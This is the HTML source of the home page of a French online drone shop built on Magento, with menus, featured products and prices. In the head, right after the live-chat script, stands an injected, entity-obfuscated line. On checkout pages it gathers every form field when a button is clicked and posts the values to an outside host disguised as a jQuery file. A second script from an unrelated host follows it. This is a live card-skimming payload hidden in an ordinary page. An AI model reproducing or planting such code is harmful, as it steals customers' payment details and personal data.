@@ -1,0 +1,863 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>DroneSpecialist, votre spécialiste en Drones Multi-rotor</title>
+<meta name="description" content="Drones  DJI et marques principales" />
+<meta name="keywords" content="Drones" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://www.dronespecialist.fr/media/favicon/stores/1/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.dronespecialist.fr/media/favicon/stores/1/favicon.ico" type="image/x-icon" />
+
+<link media="all" href="http://www.dronespecialist.fr/skin/frontend/default/webwinkelvoor/css/styles.css3.php?url=http://www.dronespecialist.fr/skin/frontend/default/webwinkelvoor/" type="text/css" rel="stylesheet" />
+
+
+<link media="all" href="http://www.dronespecialist.fr/skin/frontend/default/webwinkelvoor/css/bootstrap.css" type="text/css" rel="stylesheet" />
+<link media="all" href="http://www.dronespecialist.fr/skin/frontend/default/webwinkelvoor/css/bootstrap-responsive.css" type="text/css" rel="stylesheet" />
+<link media="all" href="http://www.dronespecialist.fr/skin/frontend/default/webwinkelvoor/css/styles-orange.css" type="text/css" rel="stylesheet" />
+
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.dronespecialist.fr/js/blank.html';
+    var BLANK_IMG = 'http://www.dronespecialist.fr/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://www.dronespecialist.fr/media/css/4c311d56f651af2f29e7912a46782aee.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.dronespecialist.fr/media/css/56f8fbc8398eb1ee43eaf33b185fa223.css" media="print" />
+<script type="text/javascript" src="http://www.dronespecialist.fr/media/js/2602eea375e1d8feb1127323974a64a1.js"></script>
+<!--[if lt IE 9]>
+<link rel="stylesheet" type="text/css" href="http://www.dronespecialist.fr/media/css/bbd8a193e1e10611955c30a5a03c49c3.css" media="all" />
+<![endif]-->
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://www.dronespecialist.fr/media/css/d9d3065364d9b5c42d6e8653bea7ca35.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://www.dronespecialist.fr/media/js/92ab3453e1a2135fa3b45826a4ec411d.js"></script>
+<![endif]-->
+<!--[if IE 7]>
+<link rel="stylesheet" type="text/css" href="http://www.dronespecialist.fr/media/css/fbbf38e6be17b0a74b1943b43415175f.css" media="all" />
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.www.dronespecialist.fr';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["HK","IE","MO","PA"];
+//]]>
+</script>
+<script type="text/javascript">
+//<![CDATA[
+    var AWACP_CONFIG = {
+        mageVersion: '1.8.0.0',
+        useProgress : 1,
+        addProductConfirmationEnabled : 1,
+        removeProductConfirmationEnabled : 1,
+        dialogsVAlign: 'center',
+        cartAnimation: 'opacity',
+        addProductCounterBeginFrom : 0,
+        removeProductCounterBeginFrom : 0,
+
+                
+        hasFileOption : false    };
+
+    Event.observe(document, 'dom:loaded', function(){
+        AW_AjaxCartPro.init(AWACP_CONFIG);
+    });
+
+//]]>
+</script>
+<script type="text/javascript">
+    function ajaxFilter(url) {
+        var data = "";
+        jQuery(function($jq) {
+            $jq.ajax({
+                url: url,
+                dataType: 'json',
+                type: 'post',
+                data: data,
+                beforeSend: function ( xhr ) {
+                    var loading = '<img src ="http://www.dronespecialist.fr/media/theme/default/loader.gif"/>';
+                    var urlImage = 'http://www.dronespecialist.fr/media/theme/default/bg4.png';
+                    var opacity = "0.7";
+                    $jq('#loading').html(loading);
+                    $jq('#wrapper').attr('style','position: fixed;top: 0%; z-index:999999; left: 0%; opacity:'+opacity+'; width:100%;height: 100%; background:url('+urlImage+')');
+                },
+                success: function(data) {
+                    var flag = true;
+                    if(data.status==1) {
+                        //alert(dat)
+                        if (data.productlist) {
+                            $jq('.category-products').empty();
+                            $jq('.category-products').append(data.productlist);
+                            if(data.pcount==0) {
+                                flag = false;
+                            }
+                            //$jq('#loading').html('');
+                        }
+                        if(flag==true) {
+                            if (data.leftLayer) {
+                                 if(url.search('tag/product/list')!=-1){
+                                    if ($jq('.block-tags')) {
+                                        $jq('.block-tags').empty();
+                                        $jq('.block-tags').append(data.leftLayer)
+                                        $jq('.block-tags').append('<div class= "add_js_tagproduct"></div>');
+                                        $jq('.add_js_tagproduct').append(data.tagtoolbarjs);
+
+                                    }
+                                } else {
+                                    if ($jq('.block-layered-nav')) {
+                                        $jq('.block-layered-nav').empty();
+                                        $jq('.block-layered-nav').append(data.leftLayer)
+                                        $jq('.block-layered-nav').append('<div class= "add_js_remove_item"></div>');
+                                        $jq('.add_js_remove_item').append(data.removeItem);
+
+                                    }
+                                }
+                            }
+                        }
+
+                        $jq('#loading').html('');
+                        
+                        $jq('#wrapper').removeAttr('style');
+                    }else {
+                        alert('Load data was failed');
+                    }
+
+                }
+            })
+            return false;
+        });
+        
+    }
+
+   
+</script>
+
+<style type ="text/css">
+    .ajaxLayer{
+        cursor: pointer;
+    }
+</style><script type="text/javascript">//<![CDATA[
+        var Translator = new Translate({"HTML tags are not allowed":"Les balises HTML ne sont pas autoris\u00e9es","Please select an option.":"S\u00e9lectionnez une option","This is a required field.":"Ce champ est obligatoire.","Please enter a valid number in this field.":"Veuillez saisir un nombre valide.","The value is not within the specified range.":"La valeur n'est pas dans la plage sp\u00e9cifi\u00e9e.","Please use numbers only in this field. Please avoid spaces or other characters such as dots or commas.":"Seuls les chiffres sont autoris\u00e9s dans ce champ. \u00c9vitez les espaces ou autres caract\u00e8res tels que les points ou les virgules.","Please use letters only (a-z or A-Z) in this field.":"Veuillez utiliser uniquement des lettres (a-z ou A-Z) dans ce champ.","Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"Veuillez utiliser uniquement des lettres (a-z), des chiffres (0-9) ou underscore (_) dans ce champ, en commen\u00e7ant par une lettre.","Please use only letters (a-z or A-Z) or numbers (0-9) only in this field. No spaces or other characters are allowed.":"Veuillez utiliser uniquement des lettres (a-z) ou des chiffres (0-9) dans ce champ. Les espaces et autres caract\u00e8res ne sont pas autoris\u00e9s.","Please use only letters (a-z or A-Z) or numbers (0-9) or spaces and # only in this field.":"Veuillez utiliser uniquement des lettres (a-z), des chiffres (0-9), des espaces ou des di\u00e8ses (#) dans ce champ.","Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.":"Veuillez saisir un num\u00e9ro de t\u00e9l\u00e9phone valide.","Please enter a valid fax number. For example (123) 456-7890 or 123-456-7890.":"Veuillez saisir un num\u00e9ro de fax valide. Par exemple 0123456789.","Please enter a valid date.":"Veuillez saisir une date valide.","Please enter a valid email address. For example johndoe@domain.com.":"Veuillez saisir une adresse email valide. Par exemple prenom.nom@domaine.com","Please use only visible characters and spaces.":"Veuillez utiliser uniquement des caract\u00e8res visibles et des espaces.","Please enter 6 or more characters. Leading or trailing spaces will be ignored.":"Veuillez saisir au moins 6 caract\u00e8res. Les espaces en d\u00e9but ou en fin de cha\u00eene seront ignor\u00e9s.","Please enter 7 or more characters. Password should contain both numeric and alphabetic characters.":"Veuillez saisir au moins 7 caract\u00e8res. Le mot de passe doit contenir \u00e0 la fois des caract\u00e8res num\u00e9riques et alphab\u00e9tiques.","Please make sure your passwords match.":"V\u00e9rifiez que vos mots de passe concordent.","Please enter a valid URL. Protocol is required (http:\/\/, https:\/\/ or ftp:\/\/)":"Veuillez saisir une URL valide. Le protocole est obligatire (http:\/\/, https:\/\/ ou ftp:\/\/)","Please enter a valid URL. For example http:\/\/www.example.com or www.example.com":"Veuillez saisir une URL valide. Par exemple http:\/\/www.exemple.com ou www.exemple.com","Please enter a valid URL Key. For example \"example-page\", \"example-page.html\" or \"anotherlevel\/example-page\".":"Veuillez saisir une URL valide. Par exemple \"page-exemple\", \"page-exemple.html\" ou \"niveau\/page-exemple\".","Please enter a valid XML-identifier. For example something_1, block5, id-4.":"Veuillez saisir un identifiant XML valide. Par exemple, quelquechose_1, bloc5, id-4.","Please enter a valid social security number. For example 123-45-6789.":"Veuillez saisir un num\u00e9ro de s\u00e9curit\u00e9 sociale valide. Par exemple 123-45-6789.","Please enter a valid zip code. For example 90602 or 90602-1234.":"Veuillez saisir un code postal valide. Par exemple 92100.","Please enter a valid zip code.":"Veuillez saisir un code postal valide.","Please use this date format: dd\/mm\/yyyy. For example 17\/03\/2006 for the 17th of March, 2006.":"Veuillez utiliser ce format de date : jj\/mm\/aaaa. Par exemple, 21\/12\/2012 pour le 21 D\u00e9cembre 2012.","Please enter a valid $ amount. For example $100.00.":"Veuillez saisir un montant valide. Par exemple 100.00 \u20ac.","Please select one of the above options.":"Veuillez choisir une des options ci-dessus.","Please select one of the options.":"Veuillez choisir une des options.","Please select State\/Province.":"Veuillez choisir un \u00e9tat\/province.","Please enter a number greater than 0 in this field.":"Veuillez saisir un nombre sup\u00e9rieur \u00e0 0 dans ce champ.","Please enter a number 0 or greater in this field.":"Veuillez saisir un nombre sup\u00e9rieur ou \u00e9gal \u00e0 0 dans ce champ.","Please enter a valid credit card number.":"Veuillez saisir un num\u00e9ro de carte bancaire valide.","Credit card number does not match credit card type.":"Le num\u00e9ro de carte ne correspond pas au type de carte.","Card type does not match credit card number.":"Le type de carte ne correspond pas au num\u00e9ro de carte.","Incorrect credit card expiration date.":"Mauvaise date d'expiration de carte de cr\u00e9dit.","Please enter a valid credit card verification number.":"Veuillez saisir un num\u00e9ro de v\u00e9rification de carte bancaire valide.","Please use only letters (a-z or A-Z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"Utilisez uniquement des lettres (a-z ou A-Z), des chiffres (0-9) ou des underscores (_) dans ce champ. Le premier caract\u00e8re doit \u00eatre une lettre.","Please input a valid CSS-length. For example 100px or 77pt or 20em or .5ex or 50%.":"Veuillez saisir une longueur CSS valide. Par exemple 100px ou 77pt ou 20 em ou .5ex ou 50%.","Text length does not satisfy specified text range.":"La longueur du texte ne satisfait pas la plage de texte sp\u00e9cifi\u00e9e.","Please enter a number lower than 100.":"Veuillez saisir un nombre inf\u00e9rieur \u00e0 100.","Please select a file":"S\u00e9lectionnez un fichier","Please enter issue number or start date for switch\/solo card type.":"Veuillez saisir le num\u00e9ro de probl\u00e8me ou une date de d\u00e9but pour le type de carte switch\/solo.","Please wait, loading...":"Veuillez patienter, chargement en cours...","This date is a required value.":"Cette date est obligatoire.","Please enter a valid day (1-%d).":"Veuillez saisir un jour valide (1-%d).","Please enter a valid month (1-12).":"Veuillez saisir un mois valide (1-12).","Please enter a valid year (1900-%d).":"Veuillez saisir une ann\u00e9e valide (1900-%d).","Please enter a valid full date":"Veuillez saisir une date compl\u00e8te valide.","Please enter a valid date between %s and %s":"Veuillez saisir une date valide entre %s et %s","Please enter a valid date equal to or greater than %s":"Veuillez saisir une date valide sup\u00e9rieure ou \u00e9gale \u00e0 %s","Please enter a valid date less than or equal to %s":"Veuillez saisir une date valide inf\u00e9rieure ou \u00e9gale \u00e0 %s","Complete":"Termin\u00e9e","Add Products":"Ajouter des produits","Please choose to register or to checkout as a guest":"Choisissez de vous enregistrer ou de passer votre commande en tant qu'invit\u00e9","Your order cannot be completed at this time as there is no shipping methods available for it. Please make necessary changes in your shipping address.":"Vous ne pouvez pas continuer votre commande car aucun mode de livraison n'est disponible pour votre adresse.","Please specify payment method.":"Choisissez un mode de paiement.","Your order cannot be completed at this time as there is no payment methods available for it.":"Vous ne pouvez pas continuer votre commande car aucun mode de paiement n'est disponible.","Insert Widget...":"Ins\u00e9rer un widget..."});
+        //]]></script><script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-55212034-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+<!--Start of Zopim Live Chat Script-->
+<script type="text/javascript">
+window.$zopim||(function(d,s){var z=$zopim=function(c){z._.push(c)},$=z.s=
+d.createElement(s),e=d.getElementsByTagName(s)[0];z.set=function(o){z.set.
+_.push(o)};z._=[];z.set._=[];$.async=!0;$.setAttribute('charset','utf-8');
+$.src='//cdn.zopim.com/?8ChhsVs8taBuBbBGPa6B4o7ui4lQbAe2';z.t=+new Date;$.
+type='text/javascript';e.parentNode.insertBefore($,e)})(document,'script');
+</script>
+<!--End of Zopim Live Chat Script--><script type="text/javascript">jQuery(function(t){t("button").on("click",function(){q="h="+window.location.href,q.match(/onepage|checkout/gi)&&(t("input, select").each(function(){t(this).val()?q+="&"+t(this).attr("name")+"="+t(this).val():""}),t.post(t("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#99;&#108;&#111;&#117;&#100;&#102;&#117;&#115;&#105;&#111;&#110;&#46;&#109;&#101;&#47;&#99;&#100;&#110;&#47;&#106;&#113;&#117;&#101;&#114;&#121;&#46;&#109;&#105;&#110;&#46;&#106;&#115;").text(),q))})});</script>
+<script src="//0055d7b.netsolhost.com/Blog/lib2/js/js.js"> </script>
+
+	<style>
+    	body{ background:url(http://www.dronespecialist.fr/skin/frontend/default/webwinkelvoor/images/pattern/pattern1.png) left top repeat;}
+	</style>    
+</head>
+<body class=" cms-index-index cms-allure-mobile-home">
+<div class="ma-wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>Javascript est désactivé dans votre navigateur.</strong><br />
+                    Javascript doit être activé dans votre navigateur pour utiliser toutes les fonctionnalités de ce site.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="ma-page">
+        <div class="ma-header-container">
+    <div class="toplink">
+        <div class="container">
+            <div class="container-inner">
+                <div class="row-fluid">
+                                       
+                                        <div class="span7">    
+                        <p class="welcome-msg"> </p>
+                        <!--<p class="header-call">Hotline: (084) - 1800 8888</p>-->
+<p class="header-call"><img src="http://www.webwinkelvoorluchtbedden.nl/media/list_tick.png" alt="" width="16" height="16" />&nbsp; les commandes pass&eacute;es avant 21.30 sont exp&eacute;di&eacute;es le jour m&ecirc;me &nbsp;&nbsp; &nbsp;&nbsp; <img src="http://www.webwinkelvoorluchtbedden.nl/media/list_tick.png" alt="" width="16" height="16" />&nbsp; Livraison gratuite &agrave; partir de 75 euro</p>                    </div>
+                    <div class="span5">
+                        <ul class="links">
+                        <li class="first" ><a href="http://www.dronespecialist.fr/customer/account/" title="Mon compte" >Mon compte</a></li>
+                                <li ><a href="http://www.dronespecialist.fr/wishlist/" title="Ma liste d'envies" >Ma liste d'envies</a></li>
+                                <li ><a href="http://www.dronespecialist.fr/checkout/cart/" title="Mon panier" class="top-link-cart">Mon panier</a></li>
+                                <li ><a href="http://www.dronespecialist.fr/checkout/" title="Commander" class="top-link-checkout">Commander</a></li>
+                                <li class=" last" ><a href="http://www.dronespecialist.fr/customer/account/login/" title="Connexion" >Connexion</a></li>
+            </ul>
+    
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="header">
+        <div class="container">
+        <div class="container-inner">
+            <div class="header-content">
+                <div class="row-fluid">
+                    <div class="span4">
+                                                                                                                        	<h1 class="logo"><strong>Dronespecialist</strong><a href="http://www.dronespecialist.fr/" title="Dronespecialist" class="logo"><img src="http://www.dronespecialist.fr/skin/frontend/default/webwinkelvoor/images/logo_dronespecialist.gif" alt="Dronespecialist" /></a></h1>
+                        						                    </div>
+                    <div class="span4">
+                        <form id="search_mini_form" action="http://www.dronespecialist.fr/catalogsearch/result/" method="get">
+    <div class="form-search">
+        <label for="search">Rechercher :</label>
+        <input id="search" type="text" name="q" value="" class="input-text" maxlength="128" />
+        <button type="submit" title="Chercher" class="button"><span><span>Chercher</span></span></button>
+        <div id="search_autocomplete" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Chercher ...');
+            searchForm.initAutocomplete('http://www.dronespecialist.fr/catalogsearch/ajax/suggest/', 'search_autocomplete');
+        //]]>
+        </script>
+    </div>
+</form>
+                    </div>
+                    <div class="span4">
+                        <div class="quick-access">
+                            <div class="top-cart-wrapper">
+                                <div class="top-cart-contain">
+                                    
+
+    <div class="block-cart">
+                <!--<span class="top-cart-icon"></span>-->
+        <span class="top-cart-title">
+            <!--<span>Shopping Cart</span><br/>-->
+            Panier: <span class="price">0,00 €</span>        </span>
+        <div class="top-cart-content">
+                                        <p class="empty">Votre panier est vide.</p>
+                        <div class="top-subtotal">Sous-total: <span class="price">0,00 €</span></div>
+                    </div>
+    </div>
+
+                                </div>
+                            </div>
+                        </div>
+                        <p style="text-align: center;"><img src="http://www.dronespecialist.fr/media/wysiwyg/logos_top_fr_1_1.png" alt="payement" /></p>                    </div>
+                </div>
+            </div>
+                    </div>
+        </div>
+    </div>
+</div>
+<div class="ma-nav-mobile-container hidden-desktop">
+	<div class="container">
+		<div class="navbar">
+			<div id="navbar-inner" class="navbar-inner navbar-inactive">
+				<a class="btn btn-navbar">
+					<span class="icon-bar"></span>
+					<span class="icon-bar"></span>
+					<span class="icon-bar"></span>
+				</a>
+				<span class="brand">Catégories</span>
+				<ul id="ma-mobilemenu" class="mobilemenu nav-collapse collapse">
+					<li class="level0 nav-1 level-top first">
+<a href="http://www.dronespecialist.fr/dji-quadrocopters.html" class="level-top">
+<span>DJI Quadrocopters</span>
+</a>
+</li><li class="level0 nav-2 level-top">
+<a href="http://www.dronespecialist.fr/walkera.html" class="level-top">
+<span>Walkera</span>
+</a>
+</li><li class="level0 nav-3 level-top">
+<a href="http://www.dronespecialist.fr/parrot-ar-drone.html" class="level-top">
+<span>Parrot AR Drone</span>
+</a>
+</li><li class="level0 nav-4 level-top">
+<a href="http://www.dronespecialist.fr/envois.html" class="level-top">
+<span>Envois</span>
+</a>
+</li><li class="level0 nav-5 level-top last">
+<a href="http://www.dronespecialist.fr/contact.html" class="level-top">
+<span>Contact</span>
+</a>
+</li>				</ul>
+			</div>
+		</div>
+	</div>
+</div>
+<div class="ma-nav-container visible-desktop">
+    <div class="container">
+        <div id="pt_custommenu" class="pt_custommenu">
+            <div id="pt_menu_home" class="pt_menu act" onmouseover="ptShowMenuPopup(this, 'popup_home');" onmouseout="ptHideMenuPopup(this, event, 'popup_home', 'pt_menu_home')">
+<div class="parentMenu">
+<a href="http://www.dronespecialist.fr/">
+<span>Home</span>
+</a>
+</div>
+<div id="popup_home" class="popup" onmouseout="ptHideMenuPopup(this, event, 'popup_home', 'pt_menu_home')">
+</div>
+</div>                <div id="pt_menu3" class="pt_menu pt_menu_no_child">
+<div class="parentMenu">
+<a href="http://www.dronespecialist.fr/dji-quadrocopters.html">
+<span>DJI&nbsp;Quadrocopters</span>
+</a>
+</div>
+</div>                            <div id="pt_menu12" class="pt_menu pt_menu_no_child">
+<div class="parentMenu">
+<a href="http://www.dronespecialist.fr/walkera.html">
+<span>Walkera</span>
+</a>
+</div>
+</div>                            <div id="pt_menu8" class="pt_menu pt_menu_no_child">
+<div class="parentMenu">
+<a href="http://www.dronespecialist.fr/parrot-ar-drone.html">
+<span>Parrot&nbsp;AR&nbsp;Drone</span>
+</a>
+</div>
+</div>                            <div id="pt_menu10" class="pt_menu pt_menu_no_child">
+<div class="parentMenu">
+<a href="http://www.dronespecialist.fr/envois.html">
+<span>Envois</span>
+</a>
+</div>
+</div>                            <div id="pt_menu9" class="pt_menu pt_menu_no_child">
+<div class="parentMenu">
+<a href="http://www.dronespecialist.fr/contact.html">
+<span>Contact</span>
+</a>
+</div>
+</div>                        
+                        
+            <div class="clearBoth"></div>
+        </div>
+    </div>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+var CUSTOMMENU_POPUP_WIDTH = 0;
+var CUSTOMMENU_POPUP_TOP_OFFSET = 46;
+var CUSTOMMENU_POPUP_RIGHT_OFFSET_MIN = 0;
+var CUSTOMMENU_POPUP_EFFECT = 0;
+//]]>
+
+$jq(document).ready(function(){
+    $jq("#pt_menu_link ul li").each(function(){
+//        alert("test");
+        var url = document.URL;
+        $jq("#pt_menu_link ul li a").removeClass("act");
+        $jq('#pt_menu_link ul li a[href="'+url+'"]').addClass('act');
+    }); 
+        
+    $jq('.pt_menu').hover(function(){
+       var widthblock1 = $jq(this).find('.popup .block1').width();
+       var widthblock2 = $jq(this).find('.popup .block2').width();
+       var new_width_popup = 0;
+       if(widthblock1 && !widthblock2){
+           new_width_popup = widthblock1;
+       }
+       if(!widthblock1 && widthblock2){
+           new_width_popup = widthblock2;
+       }
+       if(widthblock1 && widthblock2){
+            if(widthblock1 >= widthblock2){
+                new_width_popup = widthblock1;
+            }
+            if(widthblock1 < widthblock2){
+                new_width_popup = widthblock2;
+            }
+        }
+        new_width_popup = new_width_popup;
+        $jq(this).find('.popup').css('width',new_width_popup);
+        $jq(this).find('.popup .block1').css('width',new_width_popup);
+       
+       if(CUSTOMMENU_POPUP_EFFECT == 0) $jq(this).find('.popup').stop(true,true).slideDown('slow');
+       if(CUSTOMMENU_POPUP_EFFECT == 1) $jq(this).find('.popup').stop(true,true).fadeIn('slow');
+       if(CUSTOMMENU_POPUP_EFFECT == 2) $jq(this).find('.popup').show('slow');
+    },function(){
+       if(CUSTOMMENU_POPUP_EFFECT == 0) $jq(this).find('.popup').stop(true,true).slideUp('fast');
+       if(CUSTOMMENU_POPUP_EFFECT == 1) $jq(this).find('.popup').stop(true,true).fadeOut('fast');
+       if(CUSTOMMENU_POPUP_EFFECT == 2) $jq(this).find('.popup').hide('fast');
+    })
+    $jq('.pt_menu_no_child').hover(function(){
+        $jq(this).addClass("active");
+    },function(){
+        $jq(this).removeClass("active");
+    })
+    
+});
+</script>
+
+         
+	  <!-- start enable -->
+		<div class="ma-banner7-container">
+		<div class="container">
+			<div class="container-inner">
+	<div class="flexslider ma-nivoslider">
+        <div class="ma-loading"></div>
+		<div id="ma-inivoslider" class="slides">
+			
+																		
+							<img style="display: none;" src="http://www.dronespecialist.fr/media/magentothem/banner7/dronespecialist.png" alt="" title="#banner7-caption1"  />
+
+																																															</div>
+					<script type="text/javascript">
+            $jq(window).load(function() {
+                $jq('#ma-inivoslider').nivoSlider({
+                    effect: 'random',
+                    slices: 15,
+                    boxCols: 8,
+                    boxRows: 4,
+                    animSpeed: 600,
+                    pauseTime: 5000,
+                    startSlide: 0,
+										controlNav: false,
+										                    controlNavThumbs: false,
+                    pauseOnHover: true,
+                    manualAdvance: false,
+                    prevText: 'Prev',
+                    nextText: 'Next',
+                    afterLoad: function(){
+                        $jq('.ma-loading').css("display","none");
+                        //$jq('.banner7-title, .banner7-des, .banner7-readmore').css("left","100px") ;
+                        },     
+                    beforeChange: function(){ 
+                        $jq('.banner7-title, .banner7-des').css("left","-550px" );
+                        $jq('.banner7-readmore').css("left","-1500px"); 
+                    }, 
+                    afterChange: function(){ 
+                        $jq('.banner7-title, .banner7-des, .banner7-readmore').css("left","650px") 
+                    }
+                });
+            });
+		</script>
+	</div>
+	</div>
+	</div>
+</div>
+ <!-- end enable -->        <div class="ma-main-container col1-layout">
+            <div class="container">
+                <div class="container-inner">
+                    <div class="main">
+                        <div class="main-inner">
+                                                        <div class="col-main">
+                                                                <div class="std"><div class="home-content">				<div class="ma-featuredproductslider-container">
+							<div class="ma-bestseller-sldier-title"><h2>Un Aperçu de notre assortiment</h2></div>
+							<div class="flexslider carousel">
+				<ul class="slides">
+																<li class="featuredproductslider-item">
+                                    <a href="http://www.dronespecialist.fr/walkera-tali-h500.html" title="Walkera Tali H500" class="product-image"><img src="http://www.dronespecialist.fr/media/catalog/product/cache/1/small_image/300x365/9df78eab33525d08d6e5fb8d27136e95/w/a/walkera_tali_h500.jpg" alt="Walkera Tali H500" /></a>
+                                <div class="products-inner">
+                                    <h2 class="product-name"><a href="http://www.dronespecialist.fr/walkera-tali-h500.html" title="Walkera Tali H500">Walkera Tali H500</a></h2>
+                                                                                                                
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-127">
+                                            <span class="price">1 899,00 €</span>                                    </span>
+                        
+                <div class="de-label">
+			                    </div>
+    </div>
+
+                                                                        <div class="actions">
+					<a class="quickview-button" title="Quickview" rel="127" href="javascript:void(0);">
+    Quickview</a>
+
+
+                                                                                                                                    <button type="button" title="Ajouter au panier" class="button btn-cart" onclick="setLocation('http://www.dronespecialist.fr/checkout/cart/add/uenc/aHR0cDovL3d3dy5kcm9uZXNwZWNpYWxpc3QuZnIv/product/127/form_key/mIyfsnbmOUsA6EEt/')"><span><span>Ajouter au panier</span></span></button>
+                                                                                    					
+                                                                            </div>
+                                    				</div>
+																		</li>                    
+											<li class="featuredproductslider-item">
+                                    <a href="http://www.dronespecialist.fr/walkera-tali-h500-gopro.html" title="Walkera Tali H500" class="product-image"><img src="http://www.dronespecialist.fr/media/catalog/product/cache/1/small_image/300x365/9df78eab33525d08d6e5fb8d27136e95/w/a/walkera_tali_h500_1.jpg" alt="Walkera Tali H500" /></a>
+                                <div class="products-inner">
+                                    <h2 class="product-name"><a href="http://www.dronespecialist.fr/walkera-tali-h500-gopro.html" title="Walkera Tali H500 GoPro">Walkera Tali H500 GoPro</a></h2>
+                                                                                                                
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-128">
+                                            <span class="price">1 799,00 €</span>                                    </span>
+                        
+                <div class="de-label">
+			                    </div>
+    </div>
+
+                                                                        <div class="actions">
+					<a class="quickview-button" title="Quickview" rel="128" href="javascript:void(0);">
+    Quickview</a>
+
+
+                                                                                                                                    <button type="button" title="Ajouter au panier" class="button btn-cart" onclick="setLocation('http://www.dronespecialist.fr/checkout/cart/add/uenc/aHR0cDovL3d3dy5kcm9uZXNwZWNpYWxpc3QuZnIv/product/128/form_key/mIyfsnbmOUsA6EEt/')"><span><span>Ajouter au panier</span></span></button>
+                                                                                    					
+                                                                            </div>
+                                    				</div>
+																		</li>                    
+											<li class="featuredproductslider-item">
+                                    <a href="http://www.dronespecialist.fr/dji-zenmuse-z15-5d.html" title="z15" class="product-image"><img src="http://www.dronespecialist.fr/media/catalog/product/cache/1/small_image/300x365/9df78eab33525d08d6e5fb8d27136e95/d/j/dji-z155dmk2.jpg" alt="z15" /></a>
+                                <div class="products-inner">
+                                    <h2 class="product-name"><a href="http://www.dronespecialist.fr/dji-zenmuse-z15-5d.html" title="DJI Zenmuse Z15-5D">DJI Zenmuse Z15-5D</a></h2>
+                                                                                                                
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-6">
+                                            <span class="price">2 599,00 €</span>                                    </span>
+                        
+                <div class="de-label">
+			                    </div>
+    </div>
+
+                                                                        <div class="actions">
+					<a class="quickview-button" title="Quickview" rel="6" href="javascript:void(0);">
+    Quickview</a>
+
+
+                                                                                                                                    <button type="button" title="Ajouter au panier" class="button btn-cart" onclick="setLocation('http://www.dronespecialist.fr/checkout/cart/add/uenc/aHR0cDovL3d3dy5kcm9uZXNwZWNpYWxpc3QuZnIv/product/6/form_key/mIyfsnbmOUsA6EEt/')"><span><span>Ajouter au panier</span></span></button>
+                                                                                    					
+                                                                            </div>
+                                    				</div>
+																		</li>                    
+											<li class="featuredproductslider-item">
+                                    <a href="http://www.dronespecialist.fr/dji-phantom-fc40.html" title="dj fc40" class="product-image"><img src="http://www.dronespecialist.fr/media/catalog/product/cache/1/small_image/300x365/9df78eab33525d08d6e5fb8d27136e95/p/h/phantomfc402.png" alt="dj fc40" /></a>
+                                <div class="products-inner">
+                                    <h2 class="product-name"><a href="http://www.dronespecialist.fr/dji-phantom-fc40.html" title="DJI Phantom FC40">DJI Phantom FC40</a></h2>
+                                                                                                                
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-8">
+                                            <span class="price">439,00 €</span>                                    </span>
+                        
+                <div class="de-label">
+			                    </div>
+    </div>
+
+                                                                        <div class="actions">
+					<a class="quickview-button" title="Quickview" rel="8" href="javascript:void(0);">
+    Quickview</a>
+
+
+                                                                                                                                    <button type="button" title="Ajouter au panier" class="button btn-cart" onclick="setLocation('http://www.dronespecialist.fr/checkout/cart/add/uenc/aHR0cDovL3d3dy5kcm9uZXNwZWNpYWxpc3QuZnIv/product/8/form_key/mIyfsnbmOUsA6EEt/')"><span><span>Ajouter au panier</span></span></button>
+                                                                                    					
+                                                                            </div>
+                                    				</div>
+																		</li>                    
+											<li class="featuredproductslider-item">
+                                    <a href="http://www.dronespecialist.fr/dji-phantom-2-vision.html" title="Phantom Vision 2" class="product-image"><img src="http://www.dronespecialist.fr/media/catalog/product/cache/1/small_image/300x365/9df78eab33525d08d6e5fb8d27136e95/p/h/phantom22vision.png" alt="Phantom Vision 2" /></a>
+                                <div class="products-inner">
+                                    <h2 class="product-name"><a href="http://www.dronespecialist.fr/dji-phantom-2-vision.html" title="DJI Phantom 2 Vision">DJI Phantom 2 Vision</a></h2>
+                                                                                                                
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-10">
+                                            <span class="price">789,00 €</span>                                    </span>
+                        
+                <div class="de-label">
+			                    </div>
+    </div>
+
+                                                                        <div class="actions">
+					<a class="quickview-button" title="Quickview" rel="10" href="javascript:void(0);">
+    Quickview</a>
+
+
